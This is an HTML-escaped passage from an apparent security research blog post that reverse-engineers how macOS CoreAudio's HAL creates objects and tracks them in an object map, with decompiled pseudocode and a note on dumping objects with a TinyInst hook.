 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_WORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;pthread_once(&amp;amp;HALS_ObjectMap::sObjectInfoListInitialized,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALS_ObjectMap::Initialize);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALS_ObjectMap::sObjectInfoListMutex;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALB_Mutex::Lock(HALS_ObjectMap::sObjectInfoListMutex);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)HALS_ObjectMap::sNextObjectID;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;LODWORD(HALS_ObjectMap::sNextObjectID)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(_DWORD)HALS_ObjectMap::sNextObjectID&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALB_Mutex::Locker::~Locker(v6);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v7;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a2;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;!v5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a2;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v5;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)(a4&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;else&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v9;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_QWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;amp;stru_7FF850E86420;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_BYTE&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;HALS_ObjectMap::MapObject((HALS_ObjectMap&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;*)v7,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;(__int64)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;v8);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_ObjectMap::MapObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;function adds the freshly allocated object to a linked list stored on the heap. I wrote a program using the TinyInst Hook API that iterates &lt;/span&gt;&lt;span&gt;through&lt;/span&gt;&lt;span&gt;&amp;nbsp;each object in the list and dumps its raw &lt;/span&gt;&lt;span&gt;contents&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4mr2k-Dv9gAVqWmi10Eet9OaiSosPtiQc6unZW-em0ys6Lt10PkzaiIiyOFjZJWe_9OrLIRoZXXOO9t94pwZ4nA6X4iY7gECxBkTsFJwZYUBSvJc0HFLuhfkiGiGuIvK12H1xCRYZEZlmrjUk2SFyAduDZjv0Nh10ZyCO1PI3Itj_2XADzhyjEfdX8Og/s1999/image10.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4mr2k-Dv9gAVqWmi10Eet9OaiSosPtiQc6unZW-em0ys6Lt10PkzaiIiyOFjZJWe_9OrLIRoZXXOO9t94pwZ4nA6X4iY7gECxBkTsFJwZYUBSvJc0HFLuhfkiGiGuIvK12H1xCRYZEZlmrjUk2SFyAduDZjv0Nh10ZyCO1PI3Itj_2XADzhyjEfdX8Og/s1200/image10.png&quot; border=&quot;0&quot; alt=&quot;A terminal window displaying output from a command likely related to debugging or instrumenting CoreAudio. It shows messages like Instrumented module CoreAudio, OnModuleInstrumented: Looks like we made it&amp;quot; and an OBJECT DUMP section with memory addresses and hexadecimal/ASCII data.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A terminal window displaying output from a command likely related to debugging or instrumenting CoreAudio. It shows messages like Instrumented module CoreAudio, OnModuleInstrumented: Looks like we made it&amp;quot; and an OBJECT DUMP section with memory addresses and hexadecimal/ASCII data.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;To modify an existing &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span&gt;, most of the HAL Mach message handlers use the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_ObjectMap::CopyObjectByObjectID&lt;/span&gt;&lt;span&gt;&amp;nbsp;function, which accepts an integer ID (parsed from the Mach message&amp;rsquo;s body) for a given &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;, which it then looks up in the Object Map and returns a pointer to the object.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;For example, here&amp;rsquo;s a small snippet of the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;&amp;#8203;_XSystem_GetObjectInfo&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach message handler, which calls the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_ObjectMap::CopyObjectByObjectID&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;function before accessing information about the object and returning it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALS_Client::EvaluateSandboxAllowsMicAccess(v5);&lt;/span&gt;&lt;/p&gt;
